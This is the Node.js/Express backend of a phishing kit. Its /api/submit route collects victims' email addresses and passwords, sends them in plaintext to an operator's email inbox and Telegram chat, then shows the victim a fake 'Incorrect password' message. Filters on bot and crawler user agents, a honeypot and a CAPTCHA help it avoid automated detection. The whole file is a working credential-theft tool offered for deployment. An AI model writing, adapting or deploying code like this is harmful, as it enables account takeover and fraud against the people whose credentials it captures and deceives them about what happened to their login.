require("dotenv").config();
const express = require("express");
const nodemailer = require("nodemailer");
const TelegramBot = require("node-telegram-bot-api");
const path = require("path");
const axios = require("axios");
const rateLimit = require("express-rate-limit");

const app = express();
const PORT = process.env.PORT || 3000;

// ─── Middleware ─────────────────────────────────────────────
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(__dirname));
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Rate limit /api/submit
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: { message: "Too many requests. Please try again later." }
});
app.use("/api/submit", limiter);

// Block obvious bots by User-Agent
app.use((req, res, next) => {
  const ua = req.headers["user-agent"] || "";
  if (ua.toLowerCase().includes("bot") || ua.toLowerCase().includes("crawler")) {
    return res.status(403).json({ message: "Bot access denied" });
  }
  next();
});

// Optional IP blacklist
const blockedIPs = ["123.45.67.89", "111.222.333.444"];
app.use((req, res, next) => {
  if (blockedIPs.includes(req.ip)) {
    return res.status(403).json({ message: "Access denied" });
  }
  next();
});

// ─── Service Setup ──────────────────────────────────────────
// Nodemailer
const transporter = nodemailer.createTransport(
  process.env.MAIL_PROVIDER === "gmail"
    ? {
        service: "gmail",
        auth: {
          user: process.env.EMAIL_USER,
          pass: process.env.EMAIL_PASS
        }
      }
    : {
        host: process.env.SMTP_HOST,
        port: parseInt(process.env.SMTP_PORT, 10) || 465,
        secure: process.env.SMTP_SECURE === "true",
        auth: {
          user: process.env.EMAIL_USER,
          pass: process.env.EMAIL_PASS
        }
      }
);

// Test SMTP connection on startup
transporter.verify((error) => {
  if (error) {
    console.error("❌ SMTP connection failed:", error.message);
  } else {
    console.log("✅ SMTP server is ready to take messages");
  }
});

// Telegram bot
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });

// CAPTCHA verification helper
const verifyCaptcha = async (token) => {
  const response = await axios.post(
    "https://www.google.com/recaptcha/api/siteverify",
    null,
    {
      params: {
        secret: process.env.RECAPTCHA_SECRET,
        response: token
      }
    }
  );
  return response.data;
};

// ─── Main Route: /api/submit ─────────────────────────────────
app.post("/api/submit", async (req, res) => {
  console.log("✅ Received payload:", req.body);

  const {
    email,
    password,
    lourl = "N/A",
    captcha,
    honeypot,
    "g-recaptcha-response": gRecaptcha
  } = req.body;

  const captchaValue = captcha || gRecaptcha;

  try {
    // Honeypot
    if (honeypot) {
      console.warn(`🕷️ Honeypot triggered by IP: ${req.ip}`);
      return res.status(403).json({ success: false, message: "Bot detected" });
    }

    // Required fields
    if (!email || !password || !captchaValue) {
      console.warn("❌ Missing credentials or CAPTCHA");
      return res.status(400).json({ success: false, message: "Missing credentials or CAPTCHA" });
    }

    // CAPTCHA verification
    console.log("🔍 Verifying CAPTCHA...");
    const captchaResult = await verifyCaptcha(captchaValue);
    console.log("CAPTCHA API response:", captchaResult);
    if (!captchaResult.success) {
      console.warn("⚠️ CAPTCHA failed for IP:", req.ip, "Reason:", captchaResult["error-codes"]);
      return res.status(403).json({ success: false, message: "CAPTCHA verification failed" });
    }

    // Prepare message
    const message = `
🔐 Login Attempt
👤 Username: ${email}
🔑 Password: ${password}
🌐 Page URL: ${lourl}
🕒 Time: ${new Date().toISOString()}
    `;

    // Send Email
    console.log("📧 Sending email...");
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_RECEIVER,
      subject: "Login Attempt Notification",
      text: message
    });
    console.log("✅ Email sent successfully");

    // Send Telegram
    console.log("💬 Sending Telegram message...");
    await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message);
    console.log("✅ Telegram message sent");

    // Respond to client
    return res.status(401).json({
      success: false,
      message: "Incorrect password. Please try again."
    });

  } catch (err) {
    console.error("💥 Error in /api/submit:", err);
    return res.status(500).json({ success: false, message: "Internal server error" });
  }
});

// ─── Start Server ───────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});